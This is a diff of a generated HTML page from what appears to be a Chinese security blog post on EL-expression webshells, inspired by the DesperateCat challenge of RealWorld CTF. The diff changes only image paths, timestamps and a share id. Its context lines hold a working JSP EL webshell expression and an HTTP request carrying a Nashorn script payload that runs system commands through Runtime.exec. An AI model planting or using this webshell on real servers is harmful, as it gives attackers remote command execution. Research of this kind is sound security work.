@@ -14,10 +14,10 @@
 <meta property="og:description" content="从DesperateCat到EL webshell初探0x00 RWCTF引发的思考前段时间结束的Realworld ctf里有一道题目**DesperateCat**，这道题目考察的是严苛环境下写webshell的问题，对于写入文件内容的限制其中有一点：   禁止传入圆括号、尖括号、引号等。   如果我们单独处理bypass，那么其实很好解决：    尖括号 &lt;% %&gt;：使用EL表达">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140149065.png">
-<meta property="og:image" content="http://example.com/.2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140219279.png">
+<meta property="og:image" content="http://example.com/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140219279.png">
 <meta property="og:image" content="http://example.com/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220902101416244.png">
 <meta property="article:published_time" content="2022-09-12T09:58:27.000Z">
-<meta property="article:modified_time" content="2022-09-12T10:13:25.708Z">
+<meta property="article:modified_time" content="2022-09-12T10:16:03.799Z">
 <meta property="article:author" content="springtime">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140149065.png">
@@ -151,7 +151,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /test.jsp?spr1=javax.script.ScriptEngineManager HTTP/1.1</span><br><span class="line">Host: 172.20.10.2:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=4A34A77B78CD48404804BFD7420A0195</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 414</span><br><span class="line"></span><br><span class="line">spr2=try&#123;load(&quot;nashorn%3amozilla_compat.js&quot;)%3b&#125;catch(e)&#123;&#125;importPackage(Packages.java.util)%3bimportPackage(Packages.java.lang)%3bimportPackage(Packages.java.io)%3bs%3d[2]%3bs[0]%3d&#x27;cmd&#x27;%3bs[1]%3d&#x27;/c+whoami&#x27;%3ba%3d&quot;&quot;%3bb%3djava.lang.Runtime.getRuntime().exec(s).getInputStream()%3boutput+%3d+new+BufferedReader(new+InputStreamReader(b))%3bwhile+((line%3doutput.readLine())+!%3d+null)+&#123;a%3da%2bline%2b&quot;\n&quot;&#125;%3ba</span><br></pre></td></tr></table></figure>
 
 <p>然后执行，没有问题。</p>
-<p><img src="/.2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140219279.png" alt="image-20220907140219279"></p>
+<p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140219279.png" alt="image-20220907140219279"></p>
 <h2 id="0x03-进一步混淆"><a href="#0x03-进一步混淆" class="headerlink" title="0x03 进一步混淆"></a>0x03 进一步混淆</h2><p>虽然已经可以通过传递指定js脚本执行命令，但仔细来看</p>
 <figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(param.spr1).newInstance().getEngineByName(<span class="string">&quot;javascript&quot;</span>).eval(param.spr2)&#125;</span><br></pre></td></tr></table></figure>
 
@@ -189,7 +189,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/" data-id="cl7ylxr5m000168ild5ah6c8p" data-title="新型EL webshell初探" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/" data-id="cl7ym14rg0001soilbz0cguvn" data-title="新型EL webshell初探" class="article-share-link">Share</a>
       
       
       
